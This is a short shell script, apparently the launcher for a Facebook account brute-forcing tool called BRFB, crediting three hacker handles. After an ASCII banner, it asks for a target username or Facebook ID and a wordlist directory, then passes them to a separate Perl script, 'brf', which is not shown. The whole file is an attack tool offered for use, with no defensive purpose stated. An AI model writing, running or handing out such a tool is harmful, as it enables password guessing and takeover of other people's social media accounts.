#!bin/sh

#class color
kuning='\e[33;1m'
merah='\e[31;1m'
putih='\e[37;1m'
tutup='\e[39;1m'
clear
echo "";
echo -e $merah
echo -e "
 ██████╗ ██████╗ ███████╗██████╗      _______________________________
 ██╔══██╗██╔══██╗██╔════╝██╔══██╗    |                               |
 ██████╔╝██████╔╝█████╗  ██████╔╝    | Author : -$tutup$putih Sn1perXploit20     $tutup$merah|$tutup$putih
 ██╔══██╗██╔══██╗██╔══╝  ██╔══██╗    $tutup$merah|          -$tutup$putih Yoshieichiro_01 $tutup$merah   |$tutup$putih
 ██████╔╝██║  ██║██║     ██████╔╝    $tutup$merah|          -$tutup$putih ZakirDotID $tutup$merah        |$tutup$putih
 ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═════╝     $tutup$merah|_______________________________|$tutup	
";

# class warna
echo -e "$kuning ======bruteforce facebook====== $tutup"
hijau='\e[32;1m';

echo "";
echo -e $hijau

read -p 'Enter username / facebook id : ' username
read -p 'Enter wordlist directory : ' password
perl brf $username $password
